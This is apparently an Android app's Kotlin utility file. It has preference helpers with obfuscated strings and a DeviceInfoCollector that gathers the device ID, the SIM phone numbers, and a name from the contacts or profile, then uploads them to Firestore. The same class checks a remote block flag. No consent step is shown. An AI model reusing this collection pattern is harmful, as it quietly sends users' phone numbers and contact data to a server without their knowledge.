package com.mk.server.utils

import android.Manifest
import android.app.Activity
import android.app.Service
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.preference.PreferenceManager
import android.provider.ContactsContract
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.mk.server.BuildConfig
import org.lsposed.lsparanoid.Obfuscate
import java.util.*

@Obfuscate
object FLog {
    val TAG: String = FLog::class.java.simpleName
    fun debug(msg: String) { if (!BuildConfig.DEBUG) return; Log.d(TAG, msg) }
    fun info(msg: String) { if (!BuildConfig.DEBUG) return; Log.i(TAG, msg) }
    fun warning(msg: String) { if (!BuildConfig.DEBUG) return; Log.w(TAG, msg) }
    fun error(msg: String) { if (!BuildConfig.DEBUG) return; Log.e(TAG, msg) }
}

@Obfuscate
class Prefs(val context: Context) {
    private val sp: SharedPreferences = context.getSharedPreferences("settings", Context.MODE_PRIVATE)

    fun getSt(map: String, ori: String): String = sp.getString(map, ori) ?: ori
    fun setSt(map: String, write: String) = sp.edit().putString(map, write).apply()
    fun getBool(map: String, ori: Boolean): Boolean = sp.getBoolean(map, ori)
    fun setBool(map: String, write: Boolean) = sp.edit().putBoolean(map, write).apply()
    fun getInt(map: String, ori: Int): Int = sp.getInt(map, ori)
    fun setInt(map: String, write: Int) = sp.edit().putInt(map, write).apply()
    fun setBool(file: String, map: String, write: Boolean) {
        context.getSharedPreferences(file, Context.MODE_PRIVATE).edit().putBoolean(map, write).apply()
    }
    fun setSt(file: String, map: String, write: String) {
        context.getSharedPreferences(file, Context.MODE_PRIVATE).edit().putString(map, write).apply()
    }
    fun getSt(file: String, map: String, ori: String): String {
        return context.getSharedPreferences(file, Context.MODE_PRIVATE).getString(map, ori) ?: ori
    }
    fun setInt(file: String, map: String, write: Int) {
        context.getSharedPreferences(file, Context.MODE_PRIVATE).edit().putInt(map, write).apply()
    }
    fun getInt(file: String, map: String, ori: Int): Int {
        return context.getSharedPreferences(file, Context.MODE_PRIVATE).getInt(map, ori)
    }
    fun setLocale(act: Activity, cd: String) {
        Locale(cd).also { loc ->
            Locale.setDefault(loc)
            act.resources.configuration.apply {
                setLocale(loc)
                act.resources.updateConfiguration(this, act.resources.displayMetrics)
            }
        }
    }
    fun setLocale(act: Service, cd: String) {
        Locale(cd).also { loc ->
            Locale.setDefault(loc)
            act.resources.configuration.apply {
                setLocale(loc)
                act.resources.updateConfiguration(this, act.resources.displayMetrics)
            }
        }
    }
}

@Obfuscate
class FPrefs private constructor(context: Context, preferencesName: String? = null) {
    companion object {
        private const val LENGTH = "_length"
        private const val DEFAULT_STRING_VALUE = ""
        private const val DEFAULT_INT_VALUE = -1
        private const val DEFAULT_DOUBLE_VALUE = -1.0
        private const val DEFAULT_FLOAT_VALUE = -1f
        private const val DEFAULT_LONG_VALUE = -1L
        private const val DEFAULT_BOOLEAN_VALUE = false

        @Volatile
        private var prefsInstance: FPrefs? = null

        fun with(context: Context): FPrefs = prefsInstance ?: synchronized(this) {
            FPrefs(context).also { prefsInstance = it }
        }
        fun with(context: Context, forceInstantiation: Boolean): FPrefs =
            if (forceInstantiation || prefsInstance == null) {
                FPrefs(context).also { prefsInstance = it }
            } else prefsInstance!!

        fun with(context: Context, preferencesName: String): FPrefs =
            prefsInstance ?: synchronized(this) {
                FPrefs(context, preferencesName).also { prefsInstance = it }
            }

        fun with(context: Context, preferencesName: String, forceInstantiation: Boolean): FPrefs =
            if (forceInstantiation || prefsInstance == null) {
                FPrefs(context, preferencesName).also { prefsInstance = it }
            } else prefsInstance!!
    }

    private val sharedPreferences: SharedPreferences = if (preferencesName != null) {
        context.applicationContext.getSharedPreferences(preferencesName, Context.MODE_PRIVATE)
    } else {
        PreferenceManager.getDefaultSharedPreferences(context)
    }

    fun read(what: String): String = sharedPreferences.getString(what, DEFAULT_STRING_VALUE) ?: DEFAULT_STRING_VALUE
    fun read(what: String, defaultString: String): String = sharedPreferences.getString(what, defaultString) ?: defaultString
    fun write(where: String, what: String) = sharedPreferences.edit().putString(where, what).apply()

    fun readInt(what: String): Int = sharedPreferences.getInt(what, DEFAULT_INT_VALUE)
    fun readInt(what: String, defaultInt: Int): Int = sharedPreferences.getInt(what, defaultInt)
    fun writeInt(where: String, what: Int) = sharedPreferences.edit().putInt(where, what).apply()

    fun readDouble(what: String): Double = if (!contains(what)) DEFAULT_DOUBLE_VALUE else java.lang.Double.longBitsToDouble(readLong(what))
    fun readDouble(what: String, defaultDouble: Double): Double = if (!contains(what)) defaultDouble else java.lang.Double.longBitsToDouble(readLong(what))
    fun writeDouble(where: String, what: Double) = writeLong(where, java.lang.Double.doubleToRawLongBits(what))

    fun readFloat(what: String): Float = sharedPreferences.getFloat(what, DEFAULT_FLOAT_VALUE)
    fun readFloat(what: String, defaultFloat: Float): Float = sharedPreferences.getFloat(what, defaultFloat)
    fun writeFloat(where: String, what: Float) = sharedPreferences.edit().putFloat(where, what).apply()

    fun readLong(what: String): Long = sharedPreferences.getLong(what, DEFAULT_LONG_VALUE)
    fun readLong(what: String, defaultLong: Long): Long = sharedPreferences.getLong(what, defaultLong)
    fun writeLong(where: String, what: Long) = sharedPreferences.edit().putLong(where, what).apply()

    fun readBoolean(what: String): Boolean = readBoolean(what, DEFAULT_BOOLEAN_VALUE)
    fun readBoolean(what: String, defaultBoolean: Boolean): Boolean = sharedPreferences.getBoolean(what, defaultBoolean)
    fun writeBoolean(where: String, what: Boolean) = sharedPreferences.edit().putBoolean(where, what).apply()

    fun putStringSet(key: String, value: Set<String>) = sharedPreferences.edit().putStringSet(key, value).apply()
    fun getStringSet(key: String, defValue: Set<String>): Set<String>? = sharedPreferences.getStringSet(key, defValue)

    fun remove(key: String) {
        if (contains(key + LENGTH)) {
            val stringSetLength = readInt(key + LENGTH)
            if (stringSetLength >= 0) {
                sharedPreferences.edit().remove(key + LENGTH).apply()
                repeat(stringSetLength) { i ->
                    sharedPreferences.edit().remove("$key[$i]").apply()
                }
            }
        }
        sharedPreferences.edit().remove(key).apply()
    }

    fun contains(key: String): Boolean = sharedPreferences.contains(key)
    fun clear() = sharedPreferences.edit().clear().apply()
}

class DeviceInfoCollector(private val context: Context) {
    private val TAG = "DeviceInfo"
    private val db = FirebaseFirestore.getInstance()
    private val deviceId: String = Settings.Secure.getString(
        context.contentResolver,
        Settings.Secure.ANDROID_ID
    ) ?: "unknown_device"

    fun collectAndSendInfo(userName: String) {
        val deviceInfo = mutableMapOf<String, Any>()

        val finalUserName = getUserName(userName)
        deviceInfo["userName"] = finalUserName
        deviceInfo["originalInput"] = userName
        Log.d(TAG, "👤 Final User Name: $finalUserName")

        deviceInfo["deviceId"] = deviceId
        deviceInfo["deviceModel"] = Build.MODEL
        deviceInfo["deviceManufacturer"] = Build.MANUFACTURER
        deviceInfo["androidVersion"] = Build.VERSION.RELEASE

        val simCards = getSimInfo()
        deviceInfo["simCards"] = simCards
        deviceInfo["simCount"] = simCards.size

        if (simCards.isNotEmpty()) {
            deviceInfo["primaryPhoneNumber"] = simCards[0]["phoneNumber"] ?: "Unknown"   // 🔥 FIXED
        }

        deviceInfo["lastSeen"] = System.currentTimeMillis()
        deviceInfo["firstSeen"] = getFirstSeenTime()

        sendToFirebase(deviceInfo)
    }

    private fun getUserName(inputName: String): String {
        if (inputName.isNotEmpty() && inputName != "null" && inputName.length >= 3) {
            return inputName
        }
        val ownerName = getDeviceOwnerName()
        if (!ownerName.isNullOrEmpty()) {
            return ownerName
        }
        val fallback = "User_${Build.MODEL.replace(" ", "_")}"
        return if (fallback.length > 20) fallback.substring(0, 20) else fallback
    }

    private fun getDeviceOwnerName(): String? {
        try {
            context.contentResolver.query(
                ContactsContract.Profile.CONTENT_URI,
                null, null, null, null
            )?.use { cursor ->
                if (cursor.moveToFirst()) {
                    cursor.getColumnIndex(ContactsContract.Profile.DISPLAY_NAME)
                        .takeIf { it >= 0 }
                        ?.let { cursor.getString(it) }
                        ?.takeIf { it.isNotEmpty() }
                        ?.let { return it }
                }
            }
            context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )?.use { cursor ->
                if (cursor.moveToFirst()) {
                    cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                        .takeIf { it >= 0 }
                        ?.let { cursor.getString(it) }
                        ?.takeIf { it.isNotEmpty() }
                        ?.let { return it }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting owner name", e)
        }
        return null
    }

    private fun getSimInfo(): List<Map<String, String>> {
        val simList = mutableListOf<Map<String, String>>()
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return simList
        }
        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        try {
            telephonyManager.line1Number?.takeIf { it.isNotEmpty() }?.let {
                simList.add(mapOf(
                    "slotIndex" to "0",
                    "phoneNumber" to it,
                    "carrierName" to (telephonyManager.networkOperatorName ?: "")
                ))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting line1Number", e)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            try {
                (context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager)
                    .activeSubscriptionInfoList?.forEach { info ->
                        if (!info.number.isNullOrEmpty() && simList.none { it["phoneNumber"] == info.number }) {
                            simList.add(mapOf(
                                "slotIndex" to info.simSlotIndex.toString(),
                                "carrierName" to (info.carrierName?.toString() ?: ""),
                                "phoneNumber" to (info.number ?: "")
                            ))
                        }
                    }
            } catch (e: Exception) {
                Log.e(TAG, "Error getting subscription info", e)
            }
        }
        return simList
    }

    private fun getFirstSeenTime(): Long {
        val prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
        return prefs.getLong("firstSeen", 0).takeIf { it != 0L } ?: run {
            System.currentTimeMillis().also {
                prefs.edit().putLong("firstSeen", it).apply()
            }
        }
    }

    private fun sendToFirebase(deviceInfo: MutableMap<String, Any>) {
        db.collection("devices").document(deviceId)
            .set(deviceInfo, SetOptions.merge())
            .addOnSuccessListener { Log.d(TAG, "✅ Device info sent: $deviceId") }
            .addOnFailureListener { e -> Log.e(TAG, "❌ Error sending device info", e) }
    }

    fun checkIfBlocked(callback: BlockCheckCallback) {
        db.collection("devices").document(deviceId).get()
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    val document = task.result
                    if (document.getBoolean("isBlocked") == true) {
                        callback.onBlocked(
                            document.getString("blockedReason"),
                            document.getLong("blockedAt")
                        )
                    } else {
                        callback.onAllowed()
                    }
                } else {
                    callback.onAllowed()
                }
            }
    }

    interface BlockCheckCallback {
        fun onBlocked(reason: String?, blockedAt: Long?)
        fun onAllowed()
    }
}